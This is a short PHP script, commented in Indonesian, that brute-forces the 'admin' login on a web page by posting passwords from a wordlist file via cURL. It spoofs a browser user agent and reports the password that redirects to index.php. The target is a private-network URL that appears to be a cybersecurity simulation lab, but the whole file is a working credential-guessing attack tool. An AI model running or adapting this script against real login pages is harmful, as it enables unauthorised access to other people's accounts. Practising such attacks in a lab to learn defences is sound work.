<?php
$loginUrl = "http://192.168.17.5/cyber.security/simulasi-traversal/login.php";
$username = "admin";
$wordlistFile = "passwordlist.txt";

if (!file_exists($wordlistFile)) {
    die("File wordlist tidak ditemukan: $wordlistFile\n");
}

$passwords = file($wordlistFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

// Temp file untuk cookie session jika dibutuhkan
$cookieFile = tempnam(sys_get_temp_dir(), 'cookie');

foreach ($passwords as $password) {
    $postData = http_build_query([
        'username' => $username,
        'password' => $password
    ]);

    $ch = curl_init($loginUrl);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $postData,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_TIMEOUT => 5,
        CURLOPT_COOKIEJAR => $cookieFile,
        CURLOPT_COOKIEFILE => $cookieFile,
        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        CURLOPT_HEADER => false
    ]);

    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $finalUrl = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL); // Useful for redirection
    curl_close($ch);

    // Cek login berhasil:
    if (strpos($response, "index.php") !== false || strpos($finalUrl, "index.php") !== false) {
        echo "[+] BERHASIL: Password ditemukan => '$password'\n";
        break;
    } else {
        echo "[-] Gagal login dengan password: $password\n";
    }
}

// Hapus file cookie sementara
@unlink($cookieFile);
?>
